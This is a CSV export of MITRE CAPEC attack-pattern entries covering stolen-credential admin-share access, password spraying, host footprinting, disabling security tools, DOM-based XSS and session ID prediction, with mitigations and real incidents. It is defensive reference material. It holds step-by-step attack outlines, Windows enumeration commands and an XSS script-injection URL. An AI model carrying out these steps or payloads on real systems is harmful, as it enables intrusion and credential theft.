links or communications not consistent with the user's normal behavior.::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:AuthorizationTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.::Create a strong password policy and ensure that your system enforces this policy.::Ensure users are not reusing username/password combinations for multiple systems, applications, or services.::Do not reuse local administrator account credentials across systems.::Deny remote use of local admin credentials to log into domain systems.::Do not allow accounts to be a local administrator on more than one system.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.::Monitor system and domain logs for abnormal credential access.::","::Throughout 2015 and 2016, APT28 — also known as Pawn Storm, Sednit, Fancy Bear, Sofacy, and STRONTIUM — leveraged stolen credentials to infiltrate the Democratic National Committee (DNC), the United States Army, the World Anti-Doping Agency (WADA), the Court of Arbitration for Sport (TAS-CAS), and more. In most cases, the legitimate credentials were obtained via calculated spearphishing, tabnabbing, and DNS attacks targeted at corporate webmail systems. APT28 also executed several watering hole attacks, in addition to exploiting several zero-day vulnerabilities within Flash and Windows. The stolen credentials were then utilized to maintain authenticated access, laterally move within the local network, and exfiltrate sensitive information including DNC emails and personal medical records of numerous athletes. [REF-571]::In early 2019, FIN6 exploited stolen credentials from an organization within the engineering industry to laterally move within an environment via the Windows’ Remote Desktop Protocol (RDP). Multiple servers were subsequently infected with malware to create malware distribution servers, which were used to distribute the LockerGoga ransomware. [REF-573]::",::522::307::308::309::262::263::654::1273::,TAXONOMY NAME:ATTACK:ENTRY ID:1078.001:ENTRY NAME:Valid Accounts:Default Accounts::::TAXONOMY NAME:ATTACK:ENTRY ID:1078.002:ENTRY NAME:Valid Accounts:Domain Accounts::::TAXONOMY NAME:ATTACK:ENTRY ID:1078.003:ENTRY NAME:Valid Accounts:Local Accounts::,N/A,https://capec.mitre.org/data/definitions/560.html
CAPEC-561,Windows Admin Shares with Stolen Credentials,Detailed,Draft,"An adversary guesses or obtains (i.e. steals or purchases) legitimate Windows administrator credentials (e.g. userID/password) to access Windows Admin Shares on a local machine or within a Windows domain. Windows systems within the Windows NT family contain hidden network shares that are only accessible to system administrators. These shares allow administrators to remotely access all disk volumes on a network-connected system and further allow for files to be copied, written, and executed, along with other administrative actions. Example network shares include: C$, ADMIN$ and IPC$. If an adversary is able to obtain legitimate Windows credentials, the hidden shares can be accessed remotely, via server message block (SMB) or the Net utility, to transfer files and execute code. It is also possible for adversaries to utilize NTLM hashes to access administrator shares on systems with certain configuration and patch levels.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:653::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:165::NATURE:CanPrecede:CAPEC ID:549::NATURE:CanPrecede:CAPEC ID:545::,::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known Windows administrator credentials] The adversary must obtain known Windows administrator credentials in order to access the administrative network shares.TECHNIQUE:An adversary purchases breached Windows administrator credentials from the dark web.:TECHNIQUE:An adversary leverages a key logger or phishing attack to steal administrator credentials as they are provided.:TECHNIQUE:An adversary conducts a sniffing attack to steal Windows administrator credentials as they are transmitted.:TECHNIQUE:An adversary gains access to a Windows domain system/files and exfiltrates Windows administrator password hashes.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded Windows administrator credentials.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt domain authentication] Try each Windows administrator credential against the hidden network shares until the target grants access.TECHNIQUE:Manually or automatically enter each administrator credential through the target's interface.::STEP:3:PHASE:Exploit:DESCRIPTION:[Malware Execution] An adversary can remotely execute malware within the administrative network shares to infect other systems within the domain.::STEP:4:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can remotely obtain sensitive data contained within the administrative network shares.::,::The system/application is connected to the Windows domain.::The target administrative share allows remote use of local admin credentials to log into domain systems.::The adversary possesses a list of known Windows administrator credentials that exist on the target domain.::,"::SKILL:Once an adversary obtains a known Windows credential, leveraging it is trivial.:LEVEL:Low::",::A list of known Windows administrator credentials for the targeted domain.::,::Data is being transferred and/or removed from administrative network shares.::Suspicious or Malicious software is executed within administrative network shares.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:AuthorizationTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,::Do not reuse local administrator account credentials across systems.::Deny remote use of local admin credentials to log into domain systems.::Do not allow accounts to be a local administrator on more than one system.::,"::APT32 has leveraged Windows' built-in Net utility to use Windows Administrative Shares to copy and execute remote malware. [REF-579]::In May 2017, APT15 laterally moved within a Windows domain via Windows Administrative Shares to copy files to and from compromised host systems. This further allowed for the remote execution of malware. [REF-578]::",::522::308::309::294::263::262::521::,TAXONOMY NAME:ATTACK:ENTRY ID:1021.002:ENTRY NAME:Remote Services:SMB/Windows Admin Shares::,N/A,https://capec.mitre.org/data/definitions/561.html
CAPEC-562,Modify Shared File,Detailed,Draft,"An adversary manipulates the files in a shared location by adding malicious programs, scripts, or exploit code to valid content. Once a user opens the shared content, the tainted content is executed.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:17::,N/A,N/A,N/A,N/A,N/A,N/A,::Disallow shared content. Protect shared folders by minimizing users that have write access. Use utilities that mitigate exploitation like the Microsoft Enhanced Mitigation Experience Toolkit (EMET) to prevent exploits from being run.::,N/A,::284::,TAXONOMY NAME:ATTACK:ENTRY ID:1080:ENTRY NAME:Taint shared content::,N/A,https://capec.mitre.org/data/definitions/562.html
CAPEC-563,Add Malicious File to Shared Webroot,Detailed,Draft,"An adversaries may add malicious content to a website through the open file share and then browse to that content with a web browser to cause the server to execute the content. The malicious content will typically run under the context and permissions of the web server process, often resulting in local system or administrative privileges depending on how the web server is configured.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:17::,N/A,N/A,N/A,N/A,N/A,N/A,::Ensure proper permissions on directories that are accessible through a web server. Disallow remote access to the web root. Disable execution on directories within the web root. Ensure that permissions of the web server process are only what is required by not using built-in accounts and instead create specific accounts to limit unnecessary access or permissions overlap across multiple systems.::,N/A,::284::,N/A,N/A,https://capec.mitre.org/data/definitions/563.html
CAPEC-564,Run Software at Logon,Detailed,Draft,"Operating system allows logon scripts to be run whenever a specific user or users logon to a system. If adversaries can access these scripts, they may insert additional code into the logon script. This code can allow them to maintain persistence or move laterally within an enclave because it is executed every time the affected user or users logon to a computer. Modifying logon scripts can effectively bypass workstation and enclave firewalls. Depending on the access configuration of the logon scripts, either local credentials or a remote administrative account may be necessary.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:542::,N/A,N/A,N/A,N/A,N/A,N/A,::Restrict write access to logon scripts to necessary administrators.::,N/A,::284::,TAXONOMY NAME:ATTACK:ENTRY ID:1037:ENTRY NAME:Boot or Logon Initialization Scripts::::TAXONOMY NAME:ATTACK:ENTRY ID:1543.001:ENTRY NAME:Create or Modify System Process:Launch Agent::::TAXONOMY NAME:ATTACK:ENTRY ID:1547:ENTRY NAME:Boot or Logon Autostart Execution::,N/A,https://capec.mitre.org/data/definitions/564.html
CAPEC-565,Password Spraying,Detailed,Draft,"In a Password Spraying attack, an adversary tries a small list (e.g. 3-5) of common or expected passwords, often matching the target's complexity policy, against a known list of user accounts to gain valid credentials. The adversary tries a particular password for each user account, before moving onto the next password in the list. This approach assists the adversary in remaining undetected by avoiding rapid or frequent account lockouts. The adversary may then reattempt the process with additional passwords, once enough time has passed to prevent inducing a lockout.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:49::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target's password policy] Determine the password policies of the target system/application.TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Explore:DESCRIPTION:[Select passwords] Pick the passwords to be used in the attack (e.g. commonly used passwords, passwords tailored to individual users, etc.)TECHNIQUE:Select passwords based on common use or a particular user's additional details.:TECHNIQUE:Select passwords based on the target's password complexity policies.::STEP:3:PHASE:Exploit:DESCRIPTION:[Brute force password] Given the finite space of possible passwords dictated by information determined in the previous steps, try each password for all known user accounts until the target grants access.TECHNIQUE:Manually or automatically enter the first password for each known user account through the target's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.:TECHNIQUE:Iterate through the remaining passwords for each known user account.::",::The system/application uses one factor password based authentication.::The system/application does not have a sound password policy that is being enforced.::The system/application does not implement an effective password throttling mechanism.::The adversary possesses a list of known user accounts on the target system/application.::,::SKILL:A Password Spraying attack is very straightforward. A variety of password cracking tools are widely available.:LEVEL:Low::,"::A machine with sufficient resources for the job (e.g. CPU, RAM, HD).::Applicable password lists.::A password cracking tool or a custom script that leverages the password list to launch the attack.::",::Many invalid login attempts are coming from the same machine (same IP address) or for multiple user accounts within short succession.::The login attempts use passwords that have been used previously by the user account in question.::Login attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:AuthorizationTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,::Create a strong password policy and ensure that your system enforces this policy.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.::,"::A user selects the phrase Password123 as their password, believing that it would be very difficult to guess. Password Spraying, leveraging a list of commonly used passwords, is used to crack this password and gain access to the account.::The Iranian hacker group APT33 (AKA Holmium, Refined Kitten, or Elfin) carried out numerous Password Spraying attacks in 2019. On average, APT33 targeted 2,000 organizations per month, with upwards of 10 million authentication attempts each day. The majority of these attacks targeted manufacturers, suppliers, or maintainers of industrial control system equipment.::",::521::262::263::654::307::308::309::,TAXONOMY NAME:ATTACK:ENTRY ID:1110.003:ENTRY NAME:Brute Force:Password Spraying::,N/A,https://capec.mitre.org/data/definitions/565.html
CAPEC-57,Utilizing REST's Trust in the System Resource to Obtain Sensitive Data,Detailed,Draft,This attack utilizes a REST(REpresentational State Transfer)-style applications' trust in the system resources and environment to obtain sensitive data once SSL is terminated.,N/A,Medium,Very High,::NATURE:ChildOf:CAPEC ID:157::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Find a REST-style application that uses SSL] The adversary must first find a REST-style application that uses SSL to target. Because this attack is easier to carry out from inside of a server network, it is likely that an adversary could have inside knowledge of how services operate.::STEP:2:PHASE:Experiment:DESCRIPTION:[Insert a listener to sniff client-server communication] The adversary inserts a listener that must exist beyond the point where SSL is terminated. This can be placed on the client side if it is believed that sensitive information is being sent to the client as a response, although most often the listener will be placed on the server side to listen for client authentication information.TECHNIQUE:Run wireshark or tcpdump on a device that is on the inside of a firewall, load balancer, or router of a network and capture traffic after SSL has been terminated::STEP:3:PHASE:Exploit:DESCRIPTION:[Gather information passed in the clear] If developers have not hashed or encrypted data sent in the sniffed request, the adversary will be able to read this data in the clear. Most commonly, they will now have a username or password that they can use to submit requests to the web service just as an authorized user::",::Opportunity to intercept must exist beyond the point where SSL is terminated.::The adversary must be able to insert a listener actively (proxying the communication) or passively (sniffing the communication) in the client-server communication path.::,::SKILL:To insert a network sniffer or other listener into the communication stream:LEVEL:Low::,N/A,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Implementation: Implement message level security such as HMAC in the HTTP communication::Design: Utilize defense in depth, do not rely on a single security mechanism like SSL::Design: Enforce principle of least privilege::","::The Rest service provider uses SSL to protect the communications between the service requester (client) to the service provider. In the instance where SSL is terminated before the communications reach the web server, it is very common in enterprise data centers to terminate SSL at a router, firewall, load balancer, proxy or other device, then the adversary can insert a sniffer into the communication stream and gather all the authentication tokens (such as session credentials, username/passwords combinations, and so on). The Rest service requester and service provider do not have any way to detect this attack.::",::300::287::693::,N/A,N/A,https://capec.mitre.org/data/definitions/57.html
CAPEC-573,Process Footprinting,Standard,Stable,"An adversary exploits functionality meant to identify information about the currently running processes on the target system to an authorized user. By knowing what processes are running on the target system, the adversary can learn about the target environment as a means towards further malicious behavior.",N/A,Low,Low,::NATURE:ChildOf:CAPEC ID:169::,N/A,::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::,N/A,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,::Identify programs that may be used to acquire process information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist.::,"::On a Windows system, the command, tasklist, displays information about processes. The same function on a Mac OS system is done with the command, ps.::In addition to manual discovery of running processes, an adversary can develop malware that carries out this attack pattern before subsequent malicious action.::",::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1057:ENTRY NAME:Process Discovery::,N/A,https://capec.mitre.org/data/definitions/573.html
CAPEC-574,Services Footprinting,Standard,Stable,"An adversary exploits functionality meant to identify information about the services on the target system to an authorized user. By knowing what services are registered on the target system, the adversary can learn about the target environment as a means towards further malicious behavior. Depending on the operating system, commands that can obtain services information include sc and tasklist/svc using Tasklist, and net start using Net.",N/A,Low,Low,::NATURE:ChildOf:CAPEC ID:169::,N/A,::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::,N/A,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,::Identify programs that may be used to acquire service information and block them by using a software restriction policy or tools that restrict program execution by uaing a process allowlist.::,N/A,::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1007:ENTRY NAME:System Service Discovery::,N/A,https://capec.mitre.org/data/definitions/574.html
CAPEC-575,Account Footprinting,Standard,Stable,"An adversary exploits functionality meant to identify information about the domain accounts and their permissions on the target system to an authorized user. By knowing what accounts are registered on the target system, the adversary can inform further and more targeted malicious behavior. Example Windows commands which can acquire this information are: net user and dsquery.",N/A,Low,Low,::NATURE:ChildOf:CAPEC ID:169::,N/A,::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::,N/A,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,::Identify programs that may be used to acquire account information and block them by using a software restriction policy or tools that restrict program execution by uysing a process allowlist.::,N/A,::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1087:ENTRY NAME:Account Discovery::,N/A,https://capec.mitre.org/data/definitions/575.html
CAPEC-576,Group Permission Footprinting,Standard,Stable,"An adversary exploits functionality meant to identify information about user groups and their permissions on the target system to an authorized user. By knowing what users/permissions are registered on the target system, the adversary can inform further and more targeted malicious behavior. An example Windows command which can list local groups is net localgroup.",N/A,Low,Low,::NATURE:ChildOf:CAPEC ID:169::,N/A,::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::,N/A,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,::Identify programs (such as net) that may be used to enumerate local group permissions and block them by using a software restriction Policy or tools that restrict program execution by using a process allowlist.::,N/A,::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1069:ENTRY NAME:Permission Groups Discovery::,N/A,https://capec.mitre.org/data/definitions/576.html
CAPEC-577,Owner Footprinting,Standard,Draft,"An adversary exploits functionality meant to identify information about the primary users on the target system to an authorized user. They may do this, for example, by reviewing logins or file modification times. By knowing what owners use the target system, the adversary can inform further and more targeted malicious behavior. An example Windows command that may accomplish this is dir /A ntuser.dat. Which will display the last modified time of a user's ntuser.dat file when run within the root folder of a user. This time is synonymous with the last time that user was logged in.",N/A,Low,Low,::NATURE:ChildOf:CAPEC ID:169::,N/A,::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::Administrator permissions are required to view the home folder of other users.::,N/A,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,::Ensure that proper permissions on files and folders are enacted to limit accessibility.::,N/A,::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1033:ENTRY NAME:System Owner/User Discovery::,N/A,https://capec.mitre.org/data/definitions/577.html
CAPEC-578,Disable Security Software,Standard,Usable,"An adversary exploits a weakness in access control to disable security tools so that detection does not occur. This can take the form of killing processes, deleting registry keys so that tools do not start at run time, deleting log files, or other methods.",N/A,Medium,Medium,::NATURE:ChildOf:CAPEC ID:176::,N/A,::The adversary must have the capability to interact with the configuration of the targeted system.::,N/A,::None: No specialized resources are required to execute this type of attack.::,N/A,"::SCOPE:AvailabilityTECHNICAL IMPACT:Hide Activities:NOTE:Availability Hide Activities By disabling certain security tools, the adversary can hide malicious activity and avoid detection.::",::Ensure proper permissions are in place to prevent adversaries from altering the execution status of security tools.::,N/A,::284::,TAXONOMY NAME:ATTACK:ENTRY ID:1562.001:ENTRY NAME:Impair Defenses:Disable or Modify Tools::,N/A,https://capec.mitre.org/data/definitions/578.html
CAPEC-58,Restful Privilege Elevation,Detailed,Draft,"Rest uses standard HTTP (Get, Put, Delete) style permissions methods, but these are not necessarily correlated generally with back end programs. Strict interpretation of HTTP get methods means that these HTTP Get services should not be used to delete information on the server, but there is no access control mechanism to back up this logic. This means that unless the services are properly ACL'd and the application's service implementation are following these guidelines then an HTTP request can easily execute a delete or update on the server side. The attacker identifies a HTTP Get URL such as http://victimsite/updateOrder, which calls out to a program to update orders on a database or other resource. The URL is not idempotent so the request can be submitted multiple times by the attacker, additionally, the attacker may be able to exploit the URL published as a Get method that actually performs updates (instead of merely retrieving data). This may result in malicious or inadvertent altering of data on the server.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:1::NATURE:ChildOf:CAPEC ID:180::,N/A,::The attacker needs to be able to identify HTTP Get URLs. The Get methods must be set to call applications that perform operations other than get such as update and delete.::,::SKILL:It is relatively straightforward to identify an HTTP Get method that changes state on the server side and executes against an over-privileged system interface:LEVEL:Low::,N/A,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,::Design: Enforce principle of least privilege::Implementation: Ensure that HTTP Get methods only retrieve state and do not alter state on the server side::Implementation: Ensure that HTTP methods have proper ACLs based on what the functionality they expose::,"::The HTTP Get method is designed to retrieve resources and not to alter the state of the application or resources on the server side. However, developers can easily code programs that accept a HTTP Get request that do in fact create, update or delete data on the server. Both Flickr (http://www.flickr.com/services/api/flickr.photosets.delete.html) and del.icio.us (http://del.icio.us/api/posts/delete) have implemented delete operations using standard HTTP Get requests. These HTTP Get methods do delete data on the server side, despite being called from Get which is not supposed to alter state.::",::267::269::,N/A,N/A,https://capec.mitre.org/data/definitions/58.html
CAPEC-586,Object Injection,Meta,Draft,"An adversary attempts to exploit an application by injecting additional, malicious content during its processing of serialized objects. Developers leverage serialization in order to convert data or state into a static, binary format for saving to disk or transferring over a network. These objects are then deserialized when needed to recover the data/state. By injecting a malformed object into a vulnerable application, an adversary can potentially compromise the application by manipulating the deserialization process. This can result in a number of unwanted outcomes, including remote code execution.",N/A,Medium,High,N/A,N/A,::The target application must unserialize data before validation.::,N/A,N/A,N/A,"::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption If a function is making an assumption on when to terminate, based on a sentry in a string, it could easily never terminate and exhaust available resources.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data Attackers can modify objects or data that was assumed to be safe from modification.::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Functions that assume information in the deserialized object is valid could be exploited.::","::Implementation: Validate object before deserialization process::Design: Limit which types can be deserialized.::Implementation: Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. Use an allowlist of acceptable classes.::Implementation: Keep session state on the server, when possible.::",N/A,::502::,N/A,N/A,https://capec.mitre.org/data/definitions/586.html
CAPEC-588,DOM-Based XSS,Detailed,Stable,"This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is inserted into the client-side HTML being parsed by a web browser. Content served by a vulnerable web application includes script code used to manipulate the Document Object Model (DOM). This script code either does not properly validate input, or does not perform proper output encoding, thus creating an opportunity for an adversary to inject a malicious script launch a XSS attack. A key distinction between other XSS attacks and DOM-based attacks is that in other XSS attacks, the malicious script runs when the vulnerable web page is initially loaded, while a DOM-based attack executes sometime after the page loads. Another distinction of DOM-based attacks is that in some cases, the malicious script is never sent to the vulnerable web server at all. An attack like this is guaranteed to bypass any server-side filtering attempts to protect users.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:63::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for DOM-based XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads and special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. Specific to DOM-based XSS, the adversary is looking for areas where input is being used to directly change the DOM.TECHNIQUE:Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.:TECHNIQUE:Use a list of HTML special characters to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim. In DOM-based XSS, the malicious script might not even be sent to the server, since the victim's browser will manipulate the DOM itself. This can help avoid serve-side detection mechanisms.TECHNIQUE:Change a URL parameter to include a malicious script tag.:TECHNIQUE:Add a URL fragment to alter the value of the expected Document object URL.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::",::An application that leverages a client-side web browser with scripting enabled.::An application that manipulates the DOM via client-side scripting.::An application that failS to adequately sanitize or encode untrusted input.::,::SKILL:Requires the ability to write scripts of some complexity and to inject it through user controlled fields in the system.:LEVEL:Medium::,::None: No specialized resources are required to execute this type of attack.::,N/A,"::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data A successful DOM-based XSS attack can enable an adversary to exfiltrate sensitive information from the application.::SCOPE:Confidentiality:SCOPE:Authorization:SCOPE:Access ControlTECHNICAL IMPACT:Gain Privileges:NOTE:Confidentiality Authorization Access Control Gain Privileges A successful DOM-based XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands A successful DOM-based XSS attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data A successful DOM-based XSS attack can allow an adversary to tamper with application data.::",::Use browser technologies that do not allow client-side scripting.::Utilize proper character encoding for all output produced within client-site scripts manipulating the DOM.::Ensure that all user-supplied input is validated before use.::,"::Consider a web application that enables or disables some of the fields of a form on the page via the use of a mode parameter provided on the query string. http://my.site.com/aform.html?mode=full The application’s client-side code may want to print this mode value to the screen to give the users an understanding of what mode they are in. In this example, JavaScript is used to pull the value from the URL and update the HTML by dynamically manipulating the DOM via a document.write() call. <script>document.write(<p>Mode is: + document.location.href.substring(document.location.href.indexOf('mode=') + 5) + </p>);</script> Notice how the value provided on the URL is used directly with no input validation performed and no output encoding in place. A maliciously crafted URL can thus be formed such that if a victim clicked on the URL, a malicious script would then be executed by the victim’s browser: http://my.site.com/aform.html?mode=<script>alert('hi');</script>::In some DOM-based attacks, the malicious script never gets sent to the web server at all, thus bypassing any server-side protections that might be in place. Consider the previously used web application that displays the mode value. Since the HTML is being generated dynamically through DOM manipulations, a URL fragment (i.e., the part of a URL after the '#' character) can be used. http://my.site.com/aform.html#mode=<script>alert('hi')</script> In this variation of a DOM-based XSS attack, the malicious script will not be sent to the web server, but will instead be managed by the victim's browser and is still available to the client-side script code.::",::79::20::83::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Reflected DOM Injection::,N/A,https://capec.mitre.org/data/definitions/588.html
CAPEC-59,Session Credential Falsification through Prediction,Detailed,Draft,This attack targets predictable session ID in order to gain privileges. The attacker can predict the session ID used during a transaction to perform spoofing and session hijacking.,N/A,High,High,::NATURE:ChildOf:CAPEC ID:196::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Find Session IDs] The attacker interacts with the target host and finds that session IDs are used to authenticate users.TECHNIQUE:An attacker makes many anonymous connections and records the session IDs assigned.:TECHNIQUE:An attacker makes authorized connections and records the session tokens or credentials issued.::STEP:2:PHASE:Explore:DESCRIPTION:[Characterize IDs] The attacker studies the characteristics of the session ID (size, format, etc.). As a results the attacker finds that legitimate session IDs are predictable.TECHNIQUE:Cryptanalysis. The attacker uses cryptanalysis to determine if the session IDs contain any cryptographic protections.:TECHNIQUE:Pattern tests. The attacker looks for patterns (odd/even, repetition, multiples, or other arithmetic relationships) between IDs:TECHNIQUE:Comparison against time. The attacker plots or compares the issued IDs to the time they were issued to check for correlation.::STEP:3:PHASE:Experiment:DESCRIPTION:[Match issued IDs] The attacker brute forces different values of session ID and manages to predict a valid session ID.TECHNIQUE:The attacker models the session ID algorithm enough to produce a compatible session IDs, or just one match.::STEP:4:PHASE:Exploit:DESCRIPTION:[Use matched Session ID] The attacker uses the falsified session ID to access the target system.TECHNIQUE:The attacker loads the session ID into their web browser and browses to restricted data or functionality.:TECHNIQUE:The attacker loads the session ID into their network communications and impersonates a legitimate user to gain access to data or functionality.::","::The target host uses session IDs to keep track of the users.::Session IDs are used to control access to resources.::The session IDs used by the target host are predictable. For example, the session IDs are generated using predictable information (e.g., time).::",::SKILL:There are tools to brute force session ID. Those tools require a low level of knowledge.:LEVEL:Low::SKILL:Predicting Session ID may require more computation work which uses advanced analysis such as statistical analysis.:LEVEL:Medium::,N/A,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Use a strong source of randomness to generate a session ID.::Use adequate length session IDs::Do not use information available to the user in order to generate session ID (e.g., time).::Ideas for creating random numbers are offered by Eastlake [RFC1750]::Encrypt the session ID if you expose it to the user. For instance session ID can be stored in a cookie in encrypted format.::","::Jetty before 4.2.27, 5.1 before 5.1.12, 6.0 before 6.0.2, and 6.1 before 6.1.0pre3 generates predictable session identifiers using java.util.random, which makes it easier for remote attackers to guess a session identifier through brute force attacks, bypass authentication requirements, and possibly conduct cross-site request forgery attacks. See also: CVE-2006-6969::mod_usertrack in Apache 1.3.11 through 1.3.20 generates session ID's using predictable information including host IP address, system time and server process ID, which allows local users to obtain session ID's and bypass authentication when these session ID's are used for authentication. See also: CVE-2001-1534::",::290::330::331::346::488::539::200::6::285::384::693::,TAXONOMY NAME:WASC:ENTRY ID:18:ENTRY NAME:Credential/Session Prediction::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Session Prediction::,N/A,https://capec.mitre.org/data/definitions/59.html
